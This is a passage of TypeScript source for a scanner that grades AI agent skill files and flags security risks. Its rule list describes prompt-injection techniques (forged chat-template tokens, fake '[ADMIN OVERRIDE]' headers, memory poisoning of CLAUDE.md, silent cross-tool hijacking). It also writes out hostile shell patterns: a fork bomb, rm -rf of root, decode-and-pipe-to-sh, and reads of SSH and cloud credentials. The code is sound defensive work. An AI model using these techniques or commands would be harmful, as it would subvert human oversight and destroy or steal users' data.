    // the negation/“e.g.”/“such as” guard). HIGH → block. Bounded classes → no ReDoS.
    re: /<\|(?:im_start|im_end|im_sep|system|assistant|user|endoftext|end_of_turn|eot_id|start_header_id)\|>|<<\s*\/?\s*SYS\s*>>|\[\/?INST\]|\|>\s*assistant|(?:^|\n)\s*\[(?:ADMIN|SYSTEM|ROOT|DEVELOPER|OPERATOR|SUPERUSER)[\s_-]+(?:OVERRIDE|MODE|ACCESS|PROMPT|MESSAGE|INSTRUCTION|DIRECTIVE)\]|\bBEGIN\s+SYSTEM\s+(?:PROMPT|MESSAGE)\b/i,
    severity: 'high',
    category: 'injection',
    title: 'Authority / role spoofing via forged chat-template tokens',
    detail: 'Embeds a model’s chat-template control tokens (ChatML `<|im_start|>`, Llama `<<SYS>>` / `[INST]`) or a fake-authority header (`[ADMIN OVERRIDE]`, `BEGIN SYSTEM PROMPT`) to forge a system/operator message boundary — a prompt-injection technique that makes attacker text read as a privileged instruction. Legitimate skills never need to write these delimiters.',
  },
  {
    // Memory / context poisoning (OWASP Agentic ASI T1): writing an APPROVAL /
    // permission assertion into the agent's DURABLE memory (CLAUDE.md / MEMORY.md /
    // .claude memory) so future sessions skip safety checks. The generic "writes to
    // agent-config" rule (medium) covers benign memory skills; this needs the memory
    // target AND an approval/trust assertion together. Review-grade — compounds with
    // exec/exfil to block. Bounded → no ReDoS.
    re: /\b(?:CLAUDE\.md|AGENTS\.md|MEMORY\.md|\.claude\/memory)\b[^\n]{0,100}?\b(?:user\s+(?:has\s+)?approved|pre-?approved|skip\w*\s+(?:all\s+)?(?:confirm\w*|approv\w*|permission|check)|no\s+(?:need\s+to\s+|longer\s+need\s+to\s+)?(?:ask|confirm)|always\s+allows?|never\s+asks?|fully\s+trusted|bypass\w*\s+(?:confirm|approv|permission|check))\b|\b(?:user\s+(?:has\s+)?approved|pre-?approved|skip\w*\s+(?:all\s+)?(?:confirm\w*|approv\w*|permission)|no\s+(?:need\s+to\s+)?(?:ask|confirm)|always\s+allows?|never\s+asks?|fully\s+trusted)\b[^\n]{0,100}?\b(?:CLAUDE\.md|AGENTS\.md|MEMORY\.md|\.claude\/memory)\b/i,
    severity: 'medium',
    category: 'persistence',
    title: 'Memory poisoning — plants standing approvals in agent memory',
    detail: 'Writes an approval/permission assertion ("user approved", "skip all confirmations", "always allow") into the agent’s durable memory (CLAUDE.md / MEMORY.md / .claude memory) so future sessions skip safety checks. A review flag on its own; a strong signal alongside an exec/exfil action.',
  },
  {
    // Tool shadowing / cross-tool hijack (Invariant Labs): instructions that reach
    // into OTHER tools/skills — "whenever any other tool sends an email, silently
    // BCC…" — to intercept or redirect their actions. Requires a CONCEALMENT adverb
    // (silently/secretly/quietly) so a benign "after any other tool runs, log it"
    // does NOT fire. Bounded [^\n] bridges (span natural-language commas) → no ReDoS.
    re: /\b(?:before|whenever|after|when|any\s?time)\b[^\n]{0,24}?\b(?:any|another|other|each|every)\s+(?:other\s+)?(?:tool|skill|agent)\b[^\n]{0,50}?\b(?:silently|secretly|quietly|without\s+(?:telling|notifying|informing))\b[^\n]{0,24}?\b(?:bcc|cc|forward|send|copy|log|post|upload|redirect|exfil\w*)\b/i,
    severity: 'medium',
    category: 'injection',
    title: 'Cross-tool hijack — intercepts other tools/skills',
    detail: 'Instructs the agent to reach into OTHER tools/skills and silently duplicate/redirect their actions ("whenever any other tool sends an email, silently BCC…"). A review flag on its own; a strong intercept/exfil signal when paired with a destination.',
  },
  {
    // Supply-chain (OWASP LLM03): installing from a NON-official / unencrypted package
    // source — a custom `--index-url http://…`, an `http://` npm registry, `git+http://`,
    // or a direct archive URL — is the typosquat/backdoor vector (pull a malicious
    // lookalike from attacker infra instead of PyPI/npm). Official installs (pip install
    // requests) do NOT fire. Review-grade (private registries exist; the http:// ones are
    // the real tell). Bounded → no ReDoS.
    re: /--(?:index|extra-index)-url[=\s]+http:\/\/|\bnpm\s+(?:i|install|add|ci)\b[^\n]{0,60}--registry[=\s]+http:\/\/|\bgit\+http:\/\/|\bpip3?\s+install\b[^\n]{0,70}\bhttps?:\/\/[^\s'"]+\.(?:tar\.gz|zip|whl)\b/i,
    severity: 'medium',
    category: 'egress',
    title: 'Installs from a non-official / unencrypted package source',
    detail: 'Installs a package from a custom index / registry / git URL over http:// or a direct archive URL, instead of the official PyPI/npm registry — a supply-chain typosquat/backdoor vector. Verify the source is one you trust.',
  },
  {
    // Rug-pull / time-bomb (Invariant): a DATE/TIME or run-counter gate guarding a
    // network+exec action ("if date > 202609 then curl…|sh") — benign now, malicious
    // later. Static tell: a date/time condition guarding code EXECUTION (not a mere
    // date-gated API fetch). Review-grade; rare in benign skills. Bounded → no ReDoS.
    re: /\bif\b[^\n]{0,50}\b(?:\$\(date\b|\bdate\s+[+']|new\s+Date\(|Date\.now\(|datetime\.(?:now|date)|time\.time\(\))[^\n]{0,90}(?:\|\s*(?:sudo\s+)?(?:ba)?sh\b|\beval\s*\(|\bexec\s*\(|os\.system|subprocess\.(?:run|call|Popen)|child_process|curl[^\n|]{0,60}\|\s*(?:ba)?sh)/i,
    severity: 'medium',
    category: 'obfuscation',
    title: 'Time-bomb / rug-pull — date-gated code execution',
    detail: 'A date/time or counter condition guards a network-fetch-and-run or code-execution action ("if the date is past X, then curl … | sh") — the skill is benign now but flips malicious on a trigger. A hallmark of rug-pull / delayed-activation attacks.',
  },
  {
    // Human-in-the-loop DISABLE / passwordless privilege — telling the agent to
    // bypass the approval prompt or run passwordless sudo removes the human safety
    // gate. Near-never legitimate in a shared skill (OWASP LLM06 excessive agency).
    re: /--dangerously-skip-permissions|--yolo\b|\bNOPASSWD\b|\bsudo\s+(?:-n|--non-interactive)\b|\bchmod\s+(?:-R\s+)?0?777\b/i,
    severity: 'high',
    category: 'privilege',
    title: 'Disables the human approval gate / passwordless privilege',
    detail: 'Instructs the agent to bypass the permission prompt (--dangerously-skip-permissions), run passwordless sudo (NOPASSWD), or world-open files (chmod 777) — removing the human safety gate. Rarely legitimate in a shared skill.',
  },
  {
    // Resource exhaustion / fork bomb — an unmistakable denial-of-service payload.
    re: /:\s*\(\s*\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:|\bdd\s+if=\/dev\/(?:zero|urandom)\s+of=\/dev\/[sh]d/i,
    severity: 'high',
    category: 'destructive',
    title: 'Resource exhaustion / fork bomb',
    detail: 'Contains a fork bomb (:(){ :|:& };:) or a raw-device overwrite (dd of=/dev/sd…) — a denial-of-service that can hang, fill, or brick the machine.',
  },
  {
    // Password-protected archive you extract + run — a near-universal malware-
    // DELIVERY tell: the password defeats static AV/scanners on the payload, and
    // no legitimate installer ships a password-locked executable to end users.
    // (Snyk's `google` skill: "extract with pass `openclaw`, and run it".)
    re: /\b(?:extract|unzip|decompress|un7z)\b[^\n]{0,60}\b(?:pass(?:word|wd)?|pwd)\s*[:=]?\s*['"`]?[\w!@#$-]{3,}|\bpassword[- ]protected\b[^\n]{0,30}\b(?:zip|archive|rar|7z|file|payload|binary)\b/i,
    severity: 'high',
    category: 'obfuscation',
    title: 'Password-protected payload (malware-delivery pattern)',
    detail: 'Tells the user to extract a password-protected archive and run it. Password-locking a download defeats malware scanners on the payload — a near-universal malware-delivery tell, not a legitimate install method.',
  },
  {
    // DECODE-AND-RUN only. Plain decode (`atob(`, `base64 -d`) is NOT flagged — it is
    // standard benign JS (React uses `atob()`) / shell (decoding a config/token), and
    // normalizeForScan() already decodes blobs + appends the plaintext so a hidden
    // instruction surfaces to the other rules. What's malicious is decoding THEN
    // EXECUTING: eval(atob(…)), new Function(atob(…)), or `base64 -d … | sh`.
    re: /eval\s*\(\s*atob|new\s+Function\s*\(\s*[^)]{0,24}atob|(?:\bbase64\s+(?:-d|--decode)|\bxxd\s+-r|\bopenssl\s+enc\s+-d)[^\n|]{0,40}\|\s*(?:sudo\s+)?(?:ba)?sh\b/i,
    severity: 'high',
    category: 'obfuscation',
    title: 'Possible obfuscated / encoded payload',
    detail: 'Decodes-then-runs hidden content (atob / base64 -d / xxd -r) — a common way to hide code from keyword scanners.',
  },
  {
    // Private keys / cloud-credential FILES — rarely legitimate inside a skill;
    // a strong theft signal (HIGH), especially when paired with network egress.
    // Actual key MATERIAL / credential FILES — real key contents or paths, not a
    // config var NAME. A strong theft signal (HIGH). (`PRIVATE_KEY` the env-var
    // name is config → medium below; a `-----BEGIN … PRIVATE KEY-----` blob is
    // real material → here.)
    re: /~\/\.ssh|\.aws\/credentials|\.aws\/config|\bid_rsa\b|\bid_ed25519\b|-----BEGIN[A-Z\s]*PRIVATE KEY|GOOGLE_APPLICATION_CREDENTIALS/i,
    severity: 'high',
    category: 'secret',
    title: 'Reads private keys / cloud credentials',
    detail: 'Touches SSH private keys or cloud-credential files — rarely needed in a skill, and a data-theft signal when paired with network access.',
  },
  {
    // HYGIENE: a hardcoded credential LITERAL. This is the real, fixable defect that
    // an env read is NOT — `k = os.environ["API_KEY"]` is textbook-correct and costs
    // nothing, while `k = "sk-proj-Ab3x…"` ships a LIVE credential inside a file that
    // gets committed, zipped and shared. Rubric 1.0 scored these two identically
    // (both risk 72 / grade A), so the one thing genuinely worth flagging was invisible.
    // Precision-first (a false "you leaked a key" is expensive), so we key off the
    // LITERAL, not the variable name — real code writes `k = "sk-proj-…"` as often as
    // `API_KEY = "sk-proj-…"`. A vendor-prefixed token of real length inside a quoted
    // string is a credential with very high probability; every placeholder shape a
    // README uses (sk-xxxx, sk-your-key, <TOKEN>, ${VAR}) is excluded by lookahead,
    // and the rule loop's negation guard further downgrades "e.g." / "for example"
    // doc mentions. `os.environ["API_KEY"]` can never match — API_KEY has no vendor
    // prefix. Bounded alternation → no ReDoS.
    re: /["'`](?:sk-ant-(?!(?:api03-)?(?:x{3,}|your|my|test|demo|fake|dummy|example|placeholder|\.{3}))[A-Za-z0-9_-]{20,}|sk-(?!(?:x{3,}|your|my|test|demo|fake|dummy|example|placeholder|abc|\.{3}|1{3,}|0{3,}))[A-Za-z0-9][A-Za-z0-9_-]{15,}|ghp_(?!x{3,})[A-Za-z0-9]{20,}|gho_(?!x{3,})[A-Za-z0-9]{20,}|github_pat_(?!x{3,})[A-Za-z0-9_]{20,}|glpat-(?!x{3,})[A-Za-z0-9_-]{16,}|AKIA[0-9A-Z]{12,}|AIza(?!x{3,})[A-Za-z0-9_-]{30,}|xox[baprs]-(?!x{3,})[A-Za-z0-9-]{10,})["'`]/,
    severity: 'high',
    category: 'hygiene',
    title: 'Hardcoded credential in the skill file',
    detail: 'A live-looking API key/token is written directly into the skill instead of being read from the runtime environment. Anyone who receives this file receives the credential — and skills get committed, zipped and shared. Move it to an env var (e.g. `os.environ["API_KEY"]`) and rotate the exposed key.',
  },
  {
    // API keys / env config (incl. SECRET_KEY / PRIVATE_KEY — variable NAMES, not
    // key files) — the NORMAL shape of a legitimate API/deploy skill. A capability
    // worth REVIEW, not a block on its own (MEDIUM). Static analysis can't prove
    // intent (legit vs theft); it escalates only with egress + a real malice signal.
    re: /process\.env|os\.environ|\bAPI[_-]?KEY\b|\bSECRET[_-]?KEY\b|\bPRIVATE[_-]?KEY\b|\bACCESS[_-]?TOKEN\b|\bBEARER\b|x-api-key|anthropic[_-]?api[_-]?key|openai[_-]?api[_-]?key/i,
    severity: 'medium',
    category: 'secret',
    title: 'References API keys / env config',
    detail: 'Reads an API key or env var — normal for API clients. Ensure keys come from the runtime (not hardcoded); a leak risk only if sent to an untrusted endpoint.',
  },
  {
    // Guard eval/exec with a lookbehind so METHOD calls (sql.exec(), stmt.exec(),
    // .eval()) don't false-positive as process spawning — only the bare Python/JS
    // builtins + os.system/subprocess/child_process are the real risk.
    re: /(?<![\w.])eval\s*\(|(?<![\w.])exec\s*\(|os\.system|subprocess\.|child_process|\bbash\s+-c\b|\bsh\s+-c\b/i,
    severity: 'high',
    category: 'shell',
    title: 'Dynamic code execution / spawns a process',
    detail: 'Calls eval/exec/subprocess — unpredictable behavior; this is the part that most needs sandbox isolation.',
  },
  {
    // CATASTROPHIC delete: rm -rf targeting /, ~, $HOME, or a bare wildcard —
    // irreversible, almost never a legitimate skill action → block.
    re: /\brm\s+-[a-z]*r[a-z]*f[a-z]*\s+(?:--no-preserve-root\s+)?(?:\/(?:\s|$|\*)|(?:~|\$HOME)(?:\s|$|\/(?:\s|$|\*))|\*\s*$)/i,
    severity: 'critical',
    category: 'destructive',
    title: 'Catastrophic delete (rm -rf of root / home / wildcard)',
    detail: 'rm -rf targeting /, ~, $HOME, or a bare wildcard — catastrophic, irreversible data loss. Almost never a legitimate skill action.',
  },
  {
    // General destructive op → REVIEW: a build/cleanup script legitimately runs
    // `rm -rf ./dist`, so a relative-path delete is a capability, not a block.
    re: /\brm\s+-[a-z]*r[a-z]*f|\b(?:unlink|shutil\.rmtree|del\s+\/[sq])\b/i,
    severity: 'medium',
    category: 'destructive',
    title: 'Destructive file operation',
    detail: 'Contains rm -rf or a similar delete command. Often legitimate (build cleanup) — verify the target path before you trust it.',
  },
  {
    re: /\bsudo\b|chmod\s+\+?x|chmod\s+777/i,
    severity: 'medium',
    category: 'privilege',
    title: 'Privilege escalation / changes exec permission',
    detail: 'sudo or chmod +x elevates privileges or makes files executable — needs human review.',
  },
  {
    re: /```(?:bash|sh|shell|zsh|console|powershell)/i,
    severity: 'medium',
    category: 'shell',
    title: 'Embedded shell script block',
    detail: 'Ships runnable command-line scripts. Not necessarily bad, but must be sandboxed and reviewed.',
  },
  {
    re: /\bfetch\s*\(|requests\.(?:get|post)|urllib|http\.client|\baxios\b|net\.dial|\.get\(['"]https?/i,
    severity: 'medium',
    category: 'egress',
    title: 'Makes outbound network requests',
    detail: 'Sends or pulls data from external endpoints — a data-egress channel; confirm the target is trusted.',
  },
  {
    re: /\b(?:curl|wget)\b/i,
    severity: 'medium',
    category: 'egress',
    title: 'Contains curl / wget network command',
    detail: 'Accesses the network from the shell. If the target is untrusted it can pull malware or exfiltrate data.',
  },
  {
    re: /\b(?:\d{1,3}\.){3}\d{1,3}\b/,
    severity: 'low',
    category: 'egress',
    title: 'Hard-coded IP address',
    detail: 'Literal IPs are often used to bypass domain review for egress — worth verifying.',
  },
  {
    re: /\.env\b(?!\w)/i,
    severity: 'low',
    category: 'secret',
    title: 'References a .env file',
    detail: 'Touching .env usually means reading config or secrets — check its purpose.',
  },
]

const TRIGGER_CUES = /\buse\s+(?:this|it)?\s*when\b|\bwhen\s+(?:you|the\s+user|asked|reviewing|writing)\b|\btrigger\w*\s+on\b|\bfor\s+(?:reviewing|writing|generating|analyzing|debugging)\b/i
const OVERBROAD = /\b(?:any|all|every|always|whenever|anything|everything)\b/gi
const FILLER = /\b(?:helps?\s+you|assists?\s+with|useful\s+for\s+tasks|various\s+tasks|general[\s-]?purpose|anything\s+you\s+(?:need|might))\b/i
// A VAGUE opener — a weak verb that describes nothing concrete ("Helps organize your
// notes", "Assists with data"). Distinct from a clear terse description that opens with
// a specific verb ("Formats Python code…", "Reviews a PR diff"). Used ONLY to compound
// the weak-trigger penalty on genuinely-vague short descriptions, never a clear one.
const VAGUE_OPENER = /^\s*(?:this\s+skill\s+)?(?:helps?|assists?|handles?|manages?|deals?\s+with|works?\s+with|useful\s+for|lets?\s+you|allows?\s+you|supports?)\b/i

// TAINT: a secret VALUE flowing into a URL / query-string / request body (not an
// auth header). This separates real key-exfiltration (`"…?d="+key`, `-d "$TOKEN"`,
// `?key=$API_KEY`) from a benign API client that puts the key in a Bearer header —
// the co-signal that lets secret+egress escalate to a CRITICAL exfil verdict
// honestly (bounded quantifiers → no catastrophic backtracking).
const SECRET_TO_SINK = /(?:https?:\/\/[^\s"'`)]{0,200}|[?&][\w.%-]{1,40}=)["'`\s]{0,4}\+\s*[\w.$]{0,20}(?:key|token|secret|cred|process\.env|os\.environ)|[?&][\w.%-]{1,40}=\$\{?[A-Za-z_]{0,30}(?:KEY|TOKEN|SECRET|CRED)|(?:-d|--data(?:-binary|-raw)?)\s+["'`]?\$\{?[A-Za-z_]{0,30}(?:KEY|TOKEN|SECRET|PASS|CRED)/i

// A skill whose DECLARED PURPOSE is security analysis / detection / hardening
// legitimately CONTAINS attack patterns as detection EXAMPLES — like antivirus
// shipping virus signatures (Snyk's own safety-validator / security-hardening
// skills). We use this ONLY to downgrade EXAMPLE-DERIVED exfil (a *mentioned* key
// path + network) from block → REVIEW. Actual attack MECHANICS still block
// regardless (secret→sink taint, a known-exfil host, a raw-IP send, a reverse
// shell, a password payload, tag-smuggling, a persistence backdoor), so a real
// attack can NOT evade by pasting "I analyze security" into its description — worst
// case it lands at REVIEW (surfaced with all findings), never silently PASSED.
const DEFENSIVE_PURPOSE = /\b(?:analy[sz]e\w*|detect\w*|scan\w*|audit\w*|review\w*|harden\w*|lint\w*|inspect\w*|validat\w*|assess\w*|guard\w*|safeguard\w*|classif\w*|flag\w*|identif\w*)\b[^.\n]{0,48}\b(?:security|safety|unsafe|insecure|dangerous|malicious|malware|vulnerab\w*|threat\w*|risky|\brisks?\b|attack\w*|exploit\w*|injection|CVE|command\s+safet\w*)\b|\b(?:security|safety|command[- ]safety|threat|vulnerabilit\w*|malware)[- ]?(?:scanner|linter|validator|analy[sz]er|audit\w*|review\w*|hardening|guard\w*|checker|detector)\b/i

function parseFrontmatter(md: string) {
  const m = md.match(/^﻿?\s*---\s*\n([\s\S]*?)\n---/)
  const hasFrontmatter = !!m
  const fm: Record<string, string> = {}
  if (m) {
    let lastKey: string | null = null
    for (const raw of m[1].split('\n')) {
      const kv = raw.match(/^([A-Za-z0-9_-]+)\s*:\s*(.*)$/)
      if (kv) {
        lastKey = kv[1].toLowerCase()
        fm[lastKey] = kv[2].trim().replace(/^["']|["']$/g, '')
      } else if (lastKey && /^\s+\S/.test(raw)) {
        // YAML folded/continuation line — belongs to the previous key
        fm[lastKey] = `${fm[lastKey]} ${raw.trim()}`.trim()
      }
    }
  }
  const body = m ? md.slice(m[0].length) : md
  // allowed-tools may be inline ("Read, Bash") or a YAML block list (- Read\n- Bash).
  // parseFrontmatter folds continuation lines into the value, so a block list arrives
  // as "- Read - Bash"; normalize both shapes to a clean token list.
  const atRaw = fm['allowed-tools'] ?? fm['allowedtools'] ?? fm['allowed_tools']
  return { hasFrontmatter, name: fm.name, description: fm.description, allowedToolsRaw: atRaw, body }
}

// Parse an allowed-tools value into bare tool names (drops Bash(git:*) scoping,
// list dashes, quotes, brackets). Returns [] when unset.
function parseAllowedTools(raw?: string): string[] {
  if (!raw) return []
  return raw
    .replace(/^\[|\]$/g, '')
    .split(/[,\n]|\s-\s|(?<=\))\s+(?=[A-Za-z])/)
    .map((t) => t.trim().replace(/^-\s*/, '').replace(/^["']|["']$/g, '').replace(/\(.*$/, '').trim())
    .filter(Boolean)
}

// Pillar-3 skill-engineering depth: does the skill's DECLARED tool surface match what
// its body actually does? Over-declaration = needless attack surface (least privilege);
// under-declaration = the skill will fail / prompt at runtime for a tool it uses. Both
// are hygiene/correctness signals generic security scanners miss. FP-guarded: only the
// powerful, footprint-checkable tools; only when allowed-tools is explicitly declared.
const TOOL_FOOTPRINT: Record<string, RegExp> = {
  bash: /```(?:bash|sh|shell|zsh|console|powershell)|(?:^|[\n>\s])!`|\b(?:run|execute|invoke)\b[^.\n]{0,30}\b(?:command|script|shell|terminal|cli)\b|\$\(|\bnpm\b|\bgit\b|\bcurl\b|\bmkdir\b|\bchmod\b/i,
  write: /```|\bwrite\b|\bcreate\b|\bsave\b|\bgenerate\b|\bappend\b|\boverwrite\b|\bmodif|\boutput\s+(?:a|the|to)\b|fs\.write|open\([^\n]{0,30}["']w/i,
  edit: /\bedit\b|\bmodif|\breplace\b|\bupdate\b|\brefactor\b|\bfix\b|\bchange\b|\bpatch\b/i,
  webfetch: /\bfetch\b|\burl\b|https?:\/\/|\bweb\s*page\b|\bdownload\b|\bwebsite\b|\bendpoint\b|\bapi\b/i,
  websearch: /\bsearch\b|\bweb\s*search\b|\blook\s*up\b|\bgoogle\b|\bfind\s+(?:online|on\s+the\s+web)\b/i,
}
const POWERFUL_TOOLS = new Set(['bash', 'write', 'edit', 'webfetch', 'websearch'])

export function analyzeSkill(mdRaw: string, opts?: { bundleText?: string; bundleFiles?: string[] }): SkillAnalysis {
  // Normalize line endings FIRST. A CRLF (`\r\n`) file — ubiquitous on Windows and
  // in many GitHub blobs — otherwise leaves a trailing `\r` on every frontmatter line,
  // so `name: foo\r` fails the `^key:value$` match, `name`/`description` parse as empty,
  // and a valid A-grade skill silently collapses to D/F with false "Missing name/
  // description" findings. This is the single intake choke point every caller shares.
  // Bound worst-case work on adversarial input too (a real SKILL.md is a few KB; the
  // largest in our corpus is ~73KB). Analysis is client-side only, but cap anyway.
  const md = (mdRaw ?? '').replace(/\r\n?/g, '\n').slice(0, 262144)
  // Indirect-injection defense: the CLI passes the skill's REFERENCED/bundled files
  // (references/*.md, scripts/*) as bundleText. It feeds ONLY the SECURITY scan (not
  // tokens/structure/trigger, which grade the SKILL.md itself) so a payload hidden in
  // a file the SKILL.md points to still escalates the gate — a SKILL.md-only scanner
  // is trivially defeated by "clean SKILL.md, malicious references/setup.md".
  const bundleText = (opts?.bundleText ?? '').replace(/\r\n?/g, '\n').slice(0, 262144)
  const secInput = bundleText ? `${md}\n\n${bundleText}` : md
  const empty = md.trim().length < 8
  const { hasFrontmatter, name, description = '', allowedToolsRaw, body } = parseFrontmatter(md)

  const tokens = {
    total: estimateTokens(md),
    description: estimateTokens(description),
    body: estimateTokens(body),
  }

  const findings: Finding[] = []

  /* ---- Structure & spec ---- */
  let structure = 100
  if (!hasFrontmatter) {
    structure -= 45
    findings.push({ severity: 'medium', category: 'spec', title: 'Missing YAML frontmatter', detail: 'A SKILL.md should open with --- delimited metadata (at least name and description) or the agent cannot register it.' })
  }
  if (!name) {
    structure -= 20
    findings.push({ severity: 'low', category: 'spec', title: 'Missing name field', detail: 'Without a name the skill cannot be referenced reliably.' })
  } else if (/[Ѐ-ӿͰ-Ͽ]/.test(name)) {
    // Homoglyph / name-squat: Cyrillic/Greek letters that visually mimic Latin (e.g.
    // "github-officiаl" with a Cyrillic 'а') to impersonate a trusted skill's name.
    structure -= 12
    findings.push({ severity: 'medium', category: 'injection', title: 'Possible homoglyph name impersonation', detail: 'The skill name contains Cyrillic/Greek characters that look like Latin letters — a lookalike-name trick used to impersonate a trusted skill. Use plain ASCII kebab-case.' })
  } else if (!/^[a-z0-9][a-z0-9-]{0,63}$/.test(name)) {
    structure -= 8
    findings.push({ severity: 'low', category: 'spec', title: 'Non-standard name', detail: 'Use lowercase kebab-case, e.g. pr-review.' })
  } else if (/^(?:helper|helpers|util|utils|tool|tools|tooling|assistant|skill|skills|agent|agents|general|misc|main|stuff|test|demo|example|thing)$/i.test(name)) {
    // Anthropic SKILL.md spec: a name should say what the skill does — a generic
    // "helper"/"utils" gives the model no trigger signal.
    structure -= 8
    findings.push({ severity: 'low', category: 'trigger', title: 'Vague / generic name', detail: 'A generic name (“helper”, “utils”, “assistant”…) gives the model no signal about when to fire this skill. Name it after the concrete task, e.g. “pr-review”.' })
  }
  if (!description) {
    structure -= 30
    findings.push({ severity: 'medium', category: 'spec', title: 'Missing description field', detail: 'The description is the ONLY thing the agent uses to decide when to fire this skill; missing it means it never triggers.' })
  }
  if (body.trim().length < 40) {
    structure -= 15
  } else if (body.length > 600 && !/(^|\n)#{1,6}\s/.test(body)) {
    structure -= 8
    findings.push({ severity: 'low', category: 'spec', title: 'Body has no section headings', detail: 'A long body with no headings is harder for the model to parse.' })
  }
  structure = clamp(structure)

  /* ---- Triggering clarity ---- */
  let trigger = 100
  let triggerNote = 'Trigger is clear'
  if (!description) {
    trigger = 0
    triggerNote = 'No description → won’t trigger'
  } else {
    const dlen = description.length
    if (dlen < 40) { trigger -= 35; findings.push({ severity: 'medium', category: 'trigger', title: 'Description too short / vague', detail: `Only ~${dlen} chars — the model can’t tell when to use it, so it under-triggers.` }) }
    else if (dlen > 500) { trigger -= 20; findings.push({ severity: 'low', category: 'trigger', title: 'Description too long', detail: 'The description is read on every trigger check; overly long ones waste tokens and dilute the signal.' }) }
    else if (dlen > 350) { trigger -= 8 }

    if (!TRIGGER_CUES.test(description)) {
      trigger -= 25
      findings.push({ severity: 'medium', category: 'trigger', title: 'Description doesn’t say WHEN to use it', detail: 'A good description names the trigger (e.g. "when reviewing a PR"). Without it the skill mis-fires or never fires.' })
    }
    const over = description.match(OVERBROAD)
    if (over && over.length) {
      trigger -= Math.min(30, 12 * over.length)
      findings.push({ severity: 'medium', category: 'trigger', title: 'Trigger is too broad', detail: `Words like "${[...new Set(over.map((w) => w.toLowerCase()))].slice(0, 4).join('", "')}" make it fire everywhere and fight other skills for the same task — the #1 cause of conflicts.` })
    }
    if (FILLER.test(description)) {
      trigger -= 12
      findings.push({ severity: 'low', category: 'trigger', title: 'Description contains filler', detail: 'Phrases like "helps with various tasks" carry no signal — replace with a concrete scenario.' })
    }
    // Calibration (docs/knowledge-system.md P1 finding): a GENUINELY VAGUE description —
    // short, no trigger cue, AND opening with a weak/empty verb ("Helps organize your
    // notes") — is weak on triggering (the #1 discovery signal), so compound the penalty
    // enough that it honestly lands BELOW A (a sharper description via Pro can then raise
    // it). A clear terse description ("Formats Python code with black") opens with a
    // concrete verb → NOT vague → unaffected, so this never mis-downgrades a good skill.
    if (dlen < 40 && !TRIGGER_CUES.test(description) && VAGUE_OPENER.test(description)) trigger -= 10
    trigger = clamp(trigger)
    triggerNote = trigger >= 80 ? 'Trigger is clear' : trigger >= 55 ? 'Trigger could be tighter' : 'Trigger has clear problems'
  }

  /* ---- Pillar 3: skill-engineering depth (hygiene / correctness) ---- *
   * These are the differentiation a generic security scanner lacks — they don't
   * gate on safety, they make a skill correct and lean. All advisory (low), so
   * they inform the grade without ever driving a block. FP-guarded throughout.  */
  // A) allowed-tools ↔ body coherence (least privilege). Only when allowed-tools is
  //    explicitly declared (a closed allowlist), and only for the powerful, footprint-
  //    checkable tools — so we never guess about an absent declaration.
  const declaredTools = parseAllowedTools(allowedToolsRaw)
  if (declaredTools.length) {
    const declaredLc = new Set(declaredTools.map((t) => t.toLowerCase()))
    const overDeclared = [...declaredLc].filter(
      (t) => POWERFUL_TOOLS.has(t) && TOOL_FOOTPRINT[t] && !TOOL_FOOTPRINT[t].test(body),
    )
    if (overDeclared.length) {
      findings.push({
        severity: 'low',
        category: 'privilege',
        title: 'Over-declared tools (least privilege)',
        detail: `Declares ${overDeclared.map((t) => t[0].toUpperCase() + t.slice(1)).join(', ')} in allowed-tools, but the body shows no sign of using ${overDeclared.length > 1 ? 'them' : 'it'}. Every granted tool is attack surface — drop what the skill doesn’t use so a hijack can’t reach it.`,
      })
    }
    // Under-declaration: a shell code block strongly implies the skill runs shell, yet
    // Bash isn't in the allowlist → it will fail / prompt at runtime. High-precision
    // (an actual fenced shell block, not a mere mention), so it's a correctness flag.
    if (/```(?:bash|sh|shell|zsh)\b/i.test(body) && !declaredLc.has('bash')) {
      structure = clamp(structure - 6)
      findings.push({
        severity: 'low',
        category: 'spec',
        title: 'Uses shell but doesn’t declare Bash in allowed-tools',
        detail: 'The body ships a shell code block, but allowed-tools omits Bash — the skill will be blocked or prompt for permission at runtime. Add Bash (scoped to the commands it needs) or move the shell out.',
      })
    }
  }
  // B) Reference integrity: a SKILL.md that points to a bundled resource
  //    (references/…, scripts/…) which isn't actually there will break when the model
  //    tries to read it. Only runs when the CLI passes the real bundle file list.
  if (opts?.bundleFiles) {
    const have = new Set<string>()
    for (const f of opts.bundleFiles) {
      const n = f.replace(/^\.\//, '').toLowerCase()
      have.add(n)
      have.add(n.split('/').pop() || n) // also index by basename to avoid false danglings
    }
    const refRe = /(?:^|[\s(`'"[])\.?\/?((?:references?|scripts?|assets?|templates?|examples?|resources?|data|bin)\/[\w./-]{1,120}?\.[a-z0-9]{1,8})\b/gim
    const missing = new Set<string>()
    let rm: RegExpExecArray | null
    let guard = 0
    while ((rm = refRe.exec(body)) && guard++ < 200) {
      const ref = rm[1].replace(/^\.\//, '').toLowerCase()
      const base = ref.split('/').pop() || ref
      if (!have.has(ref) && !have.has(base)) missing.add(rm[1])
    }
    if (missing.size) {
      structure = clamp(structure - 12)
      const list = [...missing].slice(0, 3).join(', ')
      findings.push({
        severity: 'medium',
        category: 'spec',
        title: 'References a bundled file that isn’t present',
        detail: `Points to ${list}${missing.size > 3 ? ` (+${missing.size - 3} more)` : ''}, but ${missing.size > 1 ? 'those files aren’t' : 'that file isn’t'} in the skill bundle — the model will hit a dead link when it tries to load ${missing.size > 1 ? 'them' : 'it'}. Ship the file(s) or fix the path.`,
      })
    }
  }

  /* ---- Token efficiency ----
   * A LOG curve, not the old linear `100 - (tokens-260)/22`. That ramp hit zero at
   * ~2,460 tokens — but the real-corpus MEDIAN skill is ~2,050, so a *typical* skill
   * scored ~19/100 on efficiency and the axis effectively failed everyone. Worse: the
   * axis is 30% of the quality score and the overall formula SUBTRACTS, so a large-but-
   * safe skill (a comprehensive API reference, a format spec) cratered to D/F purely for
   * being thorough — a false "avoid" signal on skills the safety gate had PASSED. That is
   * the same category bias rubric 2.0 removed from the RISK axis, resurfacing on tokens.
   *
   * Efficiency should fall with RELATIVE size (each doubling costs a fixed amount), not
   * off a cliff at an absolute count. This curve puts the median skill mid-axis
   * (~2k→63), a lean skill near the top (~500→90), and a genuinely huge skill low but not
   * zero (~18k→23). Verified against the gold set (grade-κ unchanged at 0.809, no gold
   * entry changes band) and the real store: size ALONE can no longer push a well-built
   * skill below B, so a low grade now requires a real structure/trigger/safety defect,
   * and F is reserved for blocked/critical/unloadable — never merely "big" (see the
   * `loadable` floor in gradeFromScore).
   */
  let tokenScore = clamp(200 - 18 * Math.log(Math.max(1, tokens.total)))
